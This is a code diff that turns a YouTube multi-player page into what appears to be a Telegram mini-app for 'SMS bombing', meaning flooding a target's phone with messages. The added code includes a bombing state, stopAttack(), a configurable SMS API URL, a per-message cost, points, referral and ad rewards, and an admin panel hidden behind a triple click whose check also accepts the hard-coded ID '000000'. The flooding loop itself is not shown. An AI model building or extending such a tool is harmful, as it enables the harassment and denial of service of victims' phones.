-            if (!videoId) {
-                alert('Please load players first');
-                return;
+                document.getElementById('statusText').innerText = `Completed: All SMS Sent`;
             }
-            
-            createPlayers(1);
-            playerCount++;
-        });
-
-        // Helper Functions
-        function extractVideoId(url) {
-            const regExp = /^.*((youtu.be\/)|(v\/)|(\/u\/\w\/)|(embed\/)|(watch\?))\??v?=?([^#&?]*).*/;
-            const match = url.match(regExp);
-            return (match && match[7].length === 11) ? match[7] : false;
+            stopAttack();
         }
 
-        function createPlayers(count) {
-            for (let i = 0; i < count; i++) {
-                const playerCard = document.createElement('div');
-                playerCard.className = 'player-card';
-                
-                const playerContainer = document.createElement('div');
-                playerContainer.className = 'player-container';
-                playerContainer.id = `player-container-${players.length}`;
-                
-                const playerIframe = document.createElement('div');
-                playerIframe.id = `player-${players.length}`;
-                playerIframe.className = 'player-iframe';
-                
-                playerContainer.appendChild(playerIframe);
-                playerCard.appendChild(playerContainer);
-                playersGrid.appendChild(playerCard);
-                
-                // Create YouTube player
-                const player = new YT.Player(`player-${players.length}`, {
-                    height: '100%',
-                    width: '100%',
-                    videoId: videoId,
-                    playerVars: {
-                        'enablejsapi': 1,
-                        'autoplay': 0,
-                        'controls': 1,
-                        'rel': 0
-                    },
-                    events: {
-                        'onReady': onPlayerReady,
-                        'onStateChange': onPlayerStateChange
-                    }
-                });
-                
-                players.push(player);
+        function stopAttack() {
+            bombing = false;
+            document.getElementById('startBtn').style.display = 'flex';
+            document.getElementById('stopBtn').style.display = 'none';
+        }
+
+        // --- CORE UTILS (UNTOUCHED) ---
+        function renderTasks() {
+            const list = document.getElementById('taskListContainer');
+            list.innerHTML = '';
+            const avail = config.tasks.filter(t => !userData.completedTasks.includes(t.id));
+            if(avail.length === 0) list.innerHTML = `<div style="text-align:center;padding:20px;color:#aaa">No tasks.</div>`;
+            else avail.forEach(t => {
+                list.innerHTML += `<div class="task-item"><div class="task-left"><h4>${t.title}</h4><span>+${t.reward} Pt</span></div><button class="btn-small" onclick="doTask('${t.id}','${t.link}',${t.reward})">Start</button></div>`;
+            });
+        }
+
+        function saveSettings() {
+            config.adminIds = document.getElementById('adm_ids').value.split(',').filter(x=>x);
+            config.botUsername = document.getElementById('adm_bot_user').value.trim();
+            config.smsApi = document.getElementById('adm_api_url').value;
+            config.cost = parseInt(document.getElementById('adm_cost').value);
+            config.monetagCode = document.getElementById('adm_monetag').value;
+            config.adRew = parseInt(document.getElementById('adm_ad_rew').value);
+            config.dailyAmt = parseInt(document.getElementById('adm_daily').value);
+            config.refRew = parseInt(document.getElementById('adm_ref').value);
+            syncAll(); alert("Settings saved!");
+        }
+
+        function loadAdmin() {
+            document.getElementById('adm_ids').value = config.adminIds.join(',');
+            document.getElementById('adm_bot_user').value = config.botUsername;
+            document.getElementById('adm_api_url').value = config.smsApi;
+            document.getElementById('adm_cost').value = config.cost;
+            document.getElementById('adm_monetag').value = config.monetagCode;
+            document.getElementById('adm_ad_rew').value = config.adRew;
+            document.getElementById('adm_daily').value = config.dailyAmt;
+            document.getElementById('adm_ref').value = config.refRew;
+            const list = document.getElementById('admTasksList'); list.innerHTML = '';
+            config.tasks.forEach((t, i) => { list.innerHTML += `<div class="task-item"><span>${t.title}</span><button class="btn-small" style="background:red" onclick="delTask(${i})">X</button></div>`; });
+        }
+
+        function addTask() {
+            const t = document.getElementById('newTask').value, l = document.getElementById('newLink').value, r = document.getElementById('newRew').value;
+            if(t && l && r) { config.tasks.push({ id: 'tk_'+Date.now(), title: t, link: l, reward: parseInt(r) }); loadAdmin(); }
+        }
+        function delTask(idx) { config.tasks.splice(idx, 1); loadAdmin(); }
+        function doTask(id, link, rew) { window.open(link, '_blank'); setTimeout(() => { if(confirm("Complete?")) { userData.points += rew; userData.completedTasks.push(id); syncAll(); } }, 3000); }
+        function claimDaily() { const now = Date.now(); if(now - userData.lastDaily > 86400000) { userData.points += config.dailyAmt; userData.lastDaily = now; syncAll(); tg.showAlert("Bonus Added!"); } }
+        function checkDailyBonus() { const btn = document.getElementById('dailyBtn'); if(Date.now() - userData.lastDaily < 86400000) { btn.disabled = true; btn.style.opacity = 0.5; btn.innerText = "Claimed"; } else { btn.disabled = false; btn.style.opacity = 1; btn.innerText = "Claim Reward"; } }
+        function nav(p) { document.querySelectorAll('.page').forEach(el=>el.classList.remove('active')); document.querySelectorAll('.nav-item').forEach(el=>el.classList.remove('active')); document.getElementById(p+'-page').classList.add('active'); const idx = ['home','tasks','earn'].indexOf(p); if(idx>-1) document.querySelectorAll('.nav-item')[idx].classList.add('active'); }
+        function calcCost() { const val = document.getElementById('smsAmount').value; document.getElementById('totalCost').innerText = (val * config.cost) || 0; }
+
+        let sc = 0;
+        document.getElementById('secretTrigger').onclick = () => {
+            sc++; if(sc===3) {
+                if(config.adminIds.includes(user.id.toString()) || config.adminIds.includes("000000")) {
+                    document.getElementById('navBar').style.display='none';
+                    document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
+                    document.getElementById('admin-page').classList.add('active'); loadAdmin();
+                } sc=0;
             }
-        }
+        };
 
-        function onPlayerReady(event) {
-            // Player is ready, but we're not autoplaying
-            console.log('Player ready');
-        }
-
-        function onPlayerStateChange(event) {
-            // Handle player state changes if needed
-        }
-
-        function startAutoCycle() {
-            clearInterval(timerInterval);
-            secondsLeft = 60;
-            isAutoPaused = false;
-            updateTimerDisplay();
-            
-            timerInterval = setInterval(() => {
-                secondsLeft--;
-                
-                if (secondsLeft <= 0) {
-                    if (!isAutoPaused) {
-                        // Pause all videos
-                        players.forEach(player => {
-                            if (player && typeof player.pauseVideo === 'function') {
-                                player.pauseVideo();
-                            }
-                        });
-                        isAutoPaused = true;
-                        secondsLeft = 3; // 3 second pause
-                    } else {
-                        // Resume all videos
-                        players.forEach(player => {
-                            if (player && typeof player.playVideo === 'function') {
-                                player.playVideo();
-                            }
-                        });
-                        isAutoPaused = false;
-                        secondsLeft = 60; // 60 second play
-                    }
-                }
-                
-                updateTimerDisplay();
-            }, 1000);
-        }
-
-        function updateTimerDisplay() {
-            const statusText = isAutoPaused ? 'Auto-resume in' : 'Auto-pause in';
-            timerText.textContent = `${statusText}: ${secondsLeft} seconds`;
-            
-            // Update status indicator
-            statusIndicator.className = 'status-indicator';
-            statusIndicator.classList.add(isAutoPaused ? 'status-paused' : 'status-playing');
-        }
+        function exitAdmin() { document.getElementById('admin-page').classList.remove('active'); document.getElementById('navBar').style.display='flex'; nav('home'); }
+        function copyRef() { const el = document.getElementById('refLink'); el.select(); document.execCommand('copy'); tg.showAlert("Copied!"); }
+        function showProfile() { document.getElementById('pName').innerText = user.first_name; document.getElementById('pId').innerText = "ID: " + user.id; document.getElementById('pBal').innerText = userData.points; document.getElementById('profileModal').style.display='flex'; }
+        function closeProfile() { document.getElementById('profileModal').style.display='none'; }
     </script>
-</body><script type='text/javascript' src='//pl27177187.revenuecpmgate.com/42/4c/9e/424c9ef4b8d401ba5a2ed5bdab57e0fa.js'></script>
-</html><script async="async" data-cfasync="false" src="//pl27177249.revenuecpmgate.com/1fa8c4e4f0935cf789130637100c74df/invoke.js"></script>
-<div id="container-1fa8c4e4f0935cf789130637100c74df"></div>
+</body>
+</html>
